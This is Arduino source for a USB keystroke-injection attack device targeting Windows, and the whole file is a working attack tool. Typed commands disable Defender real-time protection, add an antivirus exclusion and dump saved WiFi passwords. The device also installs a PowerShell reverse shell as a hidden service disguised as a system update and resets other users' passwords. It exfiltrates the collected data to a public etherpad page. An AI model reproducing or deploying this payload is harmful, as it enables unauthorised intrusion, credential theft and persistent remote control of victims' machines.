#include <Keyboard.h>
#include <avr/pgmspace.h>
#define K Keyboard
// Switches to control function calls (Note that OC is initial control and is always enabled)
bool doBlackout = false;
bool doGetWiFi = false;
bool doGetSystemInfo = false;
bool doGetProcesses = false;
bool doGetApps = false;
bool doGetRemote = false;
bool doChangeCred = false;
bool doExfiltrateData = false;
bool doBye = true;
// Define paths in PROGMEM (Flash memory, for limited RAM usage)
const char etherpadWriteLink[] PROGMEM = "https://etherpad.opendev.org/p/Niquetesmorts";
const char etherpadNgrokLink[] PROGMEM = "https://etherpad.opendev.org/p/Niquetesmorts";
const char writeDir[] PROGMEM = "C:\\Users\\Public\\temp";
// Complete altcode sequence for forcing en-US layout (Layout independant)
const uint8_t altCodeSequence[][3] PROGMEM = {
  {225, 225, 226}, {225, 225, 225}, {225, 225, 233}, {225, 234, 225},
  {225, 225, 228}, {225, 225, 229}, {225, 234, 228}, {225, 234, 225},
  {225, 234, 232}, {225, 234, 232}, {227, 226, 0}, {228, 229, 0},
  {233, 233, 0}, {225, 225, 225}, {225, 234, 233}, {225, 234, 233},
  {233, 231, 0}, {225, 225, 234}, {225, 234, 234}, {227, 226, 0},
  {227, 228, 0}, {232, 227, 0}, {225, 234, 225}, {225, 225, 230},
  {228, 229, 0}, {232, 231, 0}, {225, 234, 229}, {225, 225, 234},
  {232, 229, 0}, {225, 225, 229}, {225, 234, 225}, {225, 225, 228},
  {231, 230, 0}, {233, 231, 0}, {225, 225, 234}, {225, 234, 227},
  {225, 225, 231}, {233, 231, 0}, {225, 234, 227}, {225, 234, 225},
  {231, 230, 0}, {225, 234, 229}, {225, 225, 229}, {225, 225, 230},
  {227, 226, 0}, {228, 229, 0}, {231, 234, 0}, {225, 225, 225},
  {225, 225, 228}, {233, 233, 0}, {225, 234, 225}, {227, 226, 0},
  {227, 233, 0}, {225, 234, 225}, {225, 225, 234}, {228, 229, 0},
  {232, 229, 0}, {232, 227, 0}, {227, 233, 0}, {227, 228, 0}
};
// Global buffer to reduce RAM usage
char g[128];
// Function overloads for different string types
void t(const __FlashStringHelper* fstr) {
  const char* p = (const char*)fstr;
  char c;
  while ((c = pgm_read_byte(p++))) {
    K.press(c); delay(5); K.release(c); delay(5);
  }
}

void t(const char* s) {
  while (*s) {
    K.press(*s); delay(5); K.release(*s); delay(5); s++;
  }
}
//Original control function, opens run and sets en-US layout from altstring (AltCodeSequence) and layout independant characters (Win+r, ctrl+shift+return)
void OC() {
  const int altDelay = 7;
  K.press(KEY_LEFT_GUI); K.press('r');
  delay(10); K.releaseAll();
  delay(100);
  const int numChars = sizeof(altCodeSequence) / sizeof(altCodeSequence[0]);
  for (int i = 0; i < numChars; i++) {
    K.press(KEY_LEFT_ALT);
    delay(5);
    for (int j = 0; j < 3; j++) {
      uint8_t keycode = pgm_read_byte(&(altCodeSequence[i][j]));
      if (keycode == 0) continue;
      K.press(keycode);
      delay(5);
      K.release(keycode);
      delay(5);
    }
    K.release(KEY_LEFT_ALT);
    delay(10);
  }
  K.press(KEY_LEFT_CTRL); K.press(KEY_LEFT_SHIFT); delay(altDelay); K.press(KEY_RETURN);
  delay(altDelay); K.releaseAll();
  delay(500);
  K.press(KEY_LEFT_ARROW); delay(100); K.press(KEY_RETURN);
  delay(15); K.releaseAll();
  delay(500);
  K.press(KEY_LEFT_GUI);
  K.press('r');
  delay(50);
  K.releaseAll();
  delay(500);
  t(F("cmd"));
  K.press(KEY_RETURN);
  delay(50);
  K.releaseAll();
}
//Dims the screen, creates WriteDir directory and excludes it from AV scans
//Will eventually lock cursor and keyboard inputs in the future
void Blackout() {
  t(F("powershell -Command \"(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,0)\""));
  K.press(KEY_RETURN);
  delay(10); K.releaseAll();
  delay(200);
  
  t(F("powershell Set-MpPreference -DisableRealtimeMonitoring $true"));
  K.press(KEY_RETURN);
  delay(10); K.releaseAll();
  delay(400);
  
  strcpy_P(g, writeDir);
  t(F("powershell -Command \"if (-Not (Test-Path -Path '"));
  t(g);
  t(F("')) { New-Item -ItemType Directory -Path '"));
  t(g);
  t(F("' }\""));
  K.press(KEY_RETURN);
  delay(10); K.releaseAll();
  delay(500);
  
  t(F("powershell -Command \"Add-MpPreference -ExclusionPath '"));
  t(g);
  t(F("'\""));
  K.press(KEY_RETURN);
  delay(10); K.releaseAll();
  delay(400);
}
//Get all WiFi credentials to WriteDir
void GetWiFi() {
  strcpy_P(g, writeDir);
  t(F("powershell -NoProfile -Command \"& {"));
  t(F(" $lines = netsh wlan show profiles;"));
  t(F(" $profiles = $lines | Where-Object { $_ -like '*All User Profile*' -or $_ -like '*Profil Tous*' } | ForEach-Object { ($_ -split ':')[1].Trim() };"));
  t(F(" foreach ($ssid in $profiles) { netsh wlan show profile name=\\\"$ssid\\\" key=clear; }"));
  t(F(" } | Out-File -FilePath '"));
  t(g);
  t(F("\\Wifi.txt' -Encoding utf8\""));
  K.press(KEY_RETURN);
  delay(10); K.releaseAll();
  delay(3000);
}
//Get all system infrmations to WriteDir
void GetSystemInfo() {
  strcpy_P(g, writeDir);
  t(F("powershell -Command \"systeminfo > "));
  t(g);
  t(F("\\sysinfo.txt\""));
  K.press(KEY_RETURN);
  K.releaseAll();
  delay(3000);
}
//Get process list to WriteDir
void GetProcesses() {
  strcpy_P(g, writeDir);
  t(F("powershell -Command \"Get-Process | Out-File "));
  t(g);
  t(F("\\processlist.txt\""));
  K.press(KEY_RETURN);
  K.releaseAll();
  delay(3000);
}
//Get installed apps list from Registry uninstall to WriteDir
void GetApps() {
  strcpy_P(g, writeDir);
  t(F("powershell -Command \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* "));
  t(F(", HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* "));
  t(F("| Select-Object DisplayName, DisplayVersion, Publisher "));
  t(F("| Where-Object { $_.DisplayName } "));
  t(F("| Sort-Object DisplayName "));
  t(F("| Format-Table -AutoSize | Out-File '"));
  t(g);
  t(F("\\installed_apps.txt'\""));
  
  K.press(KEY_RETURN);
  K.releaseAll();
  delay(4000);
}
//Creates backdoor as service in WriteDir
void GetRemote() {
  K.press(KEY_LEFT_GUI); K.press('r'); delay(10); K.releaseAll(); delay(100);
  t(F("msedge")); K.press(KEY_RETURN); delay(10); K.releaseAll(); delay(2000);
  // Navigate to Etherpad ngrok link and copy address
  strcpy_P(g, etherpadNgrokLink);
  t(g); K.press(KEY_RETURN); delay(3000);
  K.press(KEY_LEFT_CTRL); K.press('a'); delay(100); K.releaseAll(); delay(100);
  K.press(KEY_LEFT_CTRL); K.press('c'); delay(100); K.releaseAll(); delay(500);
  // Prepare reverse shell service script
  strcpy_P(g, writeDir);
  t(F("powershell -Command \""));
  t(F("$url = Get-Clipboard; "));
  t(F("Set-Content -Path "));
  t(g);
  t(F("\\ngrok_address.txt -Value $url; "));
  t(F("Set-Content -Path "));
  t(g);
  t(F("\\svc-rev.ps1 -Value ('while($true){try{$parts = $url -replace 'tcp://','' -split ':'; $c=New-Object Net.Sockets.TcpClient($parts[0],[int]$parts[1]); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=[Text.Encoding]::ASCII.GetString($b,0,$i); $o=(iex $d 2>&1 | Out-String); $o2=$o+\"PS \"+(pwd).Path+\" > \"; $sb=[Text.Encoding]::ASCII.GetBytes($o2); $s.Write($sb,0,$sb.Length)} } catch { Start-Sleep -Seconds 10 }}'); "));
  t(F("New-Service -Name svcRemoteShell -BinaryPathName 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "));
  t(g);
  t(F("\\svc-rev.ps1' -DisplayName 'System Remote Service' -Description 'System update service' -StartupType Automatic; "));
  t(F("Start-Service svcRemoteShell\""));

  K.press(KEY_RETURN);
  delay(7000);
}
//Helper for writing to Etherpad (reduce ExfiltrateData function length)
void WriteToEtherpad(const char* content_path) {
  K.press(KEY_LEFT_GUI); K.press('r');
  K.releaseAll();
  delay(100);
  t(content_path);
  K.press(KEY_RETURN);
  K.releaseAll();
  delay(1500);
  K.press(KEY_LEFT_CTRL); K.press('a');
  delay(100);
  K.releaseAll();
  delay(100);
  K.press(KEY_LEFT_CTRL); K.press('c');
  delay(100);
  K.releaseAll();
  delay(500);
  K.press(KEY_LEFT_GUI); K.press('r');
  delay(100);
  K.releaseAll();
  delay(500);
  t(F("msedge"));
  delay(500);
  K.press(KEY_RETURN);
  K.releaseAll();
  delay(3000);
  K.press(KEY_LEFT_CTRL); K.press('t');
  delay(50);
  K.releaseAll();
  delay(500);
  strcpy_P(g, etherpadWriteLink);
  t(g);
  delay(100);
  K.press(KEY_RETURN);
  K.releaseAll();
  delay(5000);
  K.press(KEY_LEFT_CTRL); K.press('v');
  delay(100);
  K.releaseAll();
  delay(500);
}
//Credentials substitution (seemless for victim) for persistence
void ChangeCred() {
  strcpy_P(g, writeDir);
  t(F("powershell -Command \""));
  t(F("$currentUser = (whoami).Split('\\\\\\\\')[-1];")); //Fucking backslashes
  t(F(" $newPass = ConvertTo-SecureString 'Password01' -AsPlainText -Force;"));
  t(F(" $users = Get-LocalUser | Where-Object { $_.Name -ne $currentUser };"));
  t(F(" $changedUsers = foreach ($user in $users) {"));
  t(F("   try {"));
  t(F("     Set-LocalUser -Name $user.Name -Password $newPass -ErrorAction Stop;"));
  t(F("     $user.Name"));
  t(F("   } catch { }"));
  t(F(" };"));
  t(F(" $changedUsers | Out-File -FilePath '"));
  t(g);
  t(F("\\\\ChangedCreds.txt' -Encoding UTF8\""));
  K.press(KEY_RETURN);
  delay(10);
  K.releaseAll();
  delay(4000);
}
//Extracts generated data of enabled functions to Etherpad
void ExfiltrateData() {
  if (doGetWiFi) {
    strcpy_P(g, writeDir);
    strcat(g, "\\Wifi.txt");
    WriteToEtherpad(g);
    delay(500);
  }
  if (doGetSystemInfo) {
    strcpy_P(g, writeDir);
    strcat(g, "\\sysinfo.txt");
    WriteToEtherpad(g);
    delay(500);
  }
  if (doGetProcesses) {
    strcpy_P(g, writeDir);
    strcat(g, "\\processlist.txt");
    WriteToEtherpad(g);
    delay(500);
  }
  if (doGetApps) {
    strcpy_P(g, writeDir);
    strcat(g, "\\installed_apps.txt");
    WriteToEtherpad(g);
    delay(500);
  }
  if (doChangeCred) {
    strcpy_P(g, writeDir);
    strcat(g, "\\ChangedCreds.txt");
    WriteToEtherpad(g);
    delay(500);
  }
}
//Ragebait exit function using ascii.live
void Bye() {
  K.press(KEY_LEFT_GUI);
  K.press('r');
  delay(50);
  K.releaseAll();
  delay(500);
  t(F("cmd"));
  K.press(KEY_RETURN);
  delay(50);
  K.releaseAll();
  delay(500);
  t(F("powershell -NoExit -Command \""));
  t(F("$animations = @('batman','dvd','spidyswing','purdue','as','coin','knot','torus-knot','maxwell','brittany',"));
  t(F("'batman-running','clock','donut','forrest','nyan','playstation','india','bnr','can-you-hear-me','hes','parrot','rick','bomb','earth','kitty'); "));
  t(F("while ($true) { "));
  t(F("$animation = Get-Random -InputObject $animations; "));
  t(F("Start-Process powershell.exe -ArgumentList @('-NoExit', '-Command', \\\"curl.exe ascii.live/$animation\\\"); "));
  t(F("Start-Sleep -Seconds 5; "));
  t(F("}\""));

  K.press(KEY_RETURN);
  delay(50); K.releaseAll();
}
//Setup function (single run), executing enabled functions
void setup() {
  Keyboard.begin();
  delay(3000);
  OC();
  delay(500);
  if (doBlackout) Blackout();
  delay(500);
  if (doGetWiFi) GetWiFi();
  delay(500);
  if (doGetSystemInfo) GetSystemInfo();
  delay(500);
  if (doGetProcesses) GetProcesses();
  delay(500);
  if (doGetApps) GetApps();
  delay(500);
  if (doGetRemote) GetRemote();
  delay(500);
  if (doChangeCred) ChangeCred();
  delay(500);
  if (doExfiltrateData) ExfiltrateData();
  delay(500);
  if (doBye) Bye();
  Keyboard.end();
}
//No loop, disconnect after run
void loop() {}